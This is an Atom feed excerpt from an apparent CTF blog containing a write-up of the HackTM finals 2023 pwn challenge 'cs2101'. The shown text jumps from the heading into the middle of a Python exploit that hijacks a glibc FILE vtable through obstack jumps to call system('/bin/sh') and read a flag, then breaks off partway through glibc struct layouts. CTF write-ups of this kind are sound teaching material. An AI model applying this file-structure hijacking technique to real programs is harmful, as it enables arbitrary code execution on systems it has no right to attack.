<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[linux on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/linux/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/linux/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2023-05-23T23:50:29+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/linux/</id>
        
        <entry>
            <title type="html"><![CDATA[[HackTM finals 2023 - pwn] cs2101]]></title>
            <link href="https://nasm.re/posts/cs2101/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cs2101/</id>
            
            <published>2023-05-15T00:00:00+00:00</published>
            <updated>2023-05-15T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="cs2101">
        cs2101
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#cs2101" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor cs2101" href="#cs2101">

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">9</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">obstack</span><span class="p">)</span>

    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_read_base</span><span class="p">)</span>

    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">chunkfun</span><span class="p">)</span> <span class="c1"># fn ptr, system</span>
    <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">extra_arg</span><span class="p">)</span> <span class="c1"># arg</span>
    <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="kc">True</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">use_extra_arg</span><span class="p">)</span>

    <span class="n">fflush</span><span class="p">()</span>
    <span class="c1"># system(&#34;/bin/sh&#34;)</span>

    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

<span class="s2">&#34;&#34;&#34;
</span><span class="s2">type = struct _IO_FILE {
</span><span class="s2">/*      0      |       4 */    int _flags;
</span><span class="s2">/* XXX  4-byte hole      */
</span><span class="s2">/*      8      |       8 */    char *_IO_read_ptr;
</span><span class="s2">/*     16      |       8 */    char *_IO_read_end;
</span><span class="s2">/*     24      |       8 */    char *_IO_read_base;
</span><span class="s2">/*     32      |       8 */    char *_IO_write_base;
</span><span class="s2">/*     40      |       8 */    char *_IO_write_ptr;
</span><span class="s2">/*     48      |       8 */    char *_IO_write_end;
</span><span class="s2">/*     56      |       8 */    char *_IO_buf_base;
</span><span class="s2">/*     64      |       8 */    char *_IO_buf_end;
</span><span class="s2">/*     72      |       8 */    char *_IO_save_base;
</span><span class="s2">/*     80      |       8 */    char *_IO_backup_base;
</span><span class="s2">/*     88      |       8 */    char *_IO_save_end;
</span><span class="s2">/*     96      |       8 */    struct _IO_marker *_markers;
</span><span class="s2">/*    104      |       8 */    struct _IO_FILE *_chain;
</span><span class="s2">/*    112      |       4 */    int _fileno;
</span><span class="s2">/*    116      |       4 */    int _flags2;
</span><span class="s2">/*    120      |       8 */    __off_t _old_offset;
</span><span class="s2">/*    128      |       2 */    unsigned short _cur_column;
</span><span class="s2">/*    130      |       1 */    signed char _vtable_offset;
</span><span class="s2">/*    131      |       1 */    char _shortbuf[1];
</span><span class="s2">/* XXX  4-byte hole      */
</span><span class="s2">/*    136      |       8 */    _IO_lock_t *_lock;
</span><span class="s2">/*    144      |       8 */    __off64_t _offset;
</span><span class="s2">/*    152      |       8 */    struct _IO_codecvt *_codecvt;
</span><span class="s2">/*    160      |       8 */    struct _IO_wide_data *_wide_data;
</span><span class="s2">/*    168      |       8 */    struct _IO_FILE *_freeres_list;
</span><span class="s2">/*    176      |       8 */    void *_freeres_buf;
</span><span class="s2">/*    184      |       8 */    size_t __pad5;
</span><span class="s2">/*    192      |       4 */    int _mode;
</span><span class="s2">/*    196      |      20 */    char _unused2[20];
</span><span class="s2">
</span><span class="s2">                               /* total size (bytes):  216 */
</span><span class="s2">                             }
</span><span class="s2">
</span><span class="s2">struct obstack          /* control current object in current chunk */
</span><span class="s2">{
</span><span class="s2">  long chunk_size;              /* preferred size to allocate chunks in */
</span><span class="s2">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
</span><span class="s2">  char *object_base;            /* address of object we are building */
</span><span class="s2">  char *next_free;              /* where to add next char to current object */
</span><span class="s2">  char *chunk_limit;            /* address of char after current chunk */
</span><span class="s2">  union
</span><span class="s2">  {
</span><span class="s2">    PTR_INT_TYPE tempint;
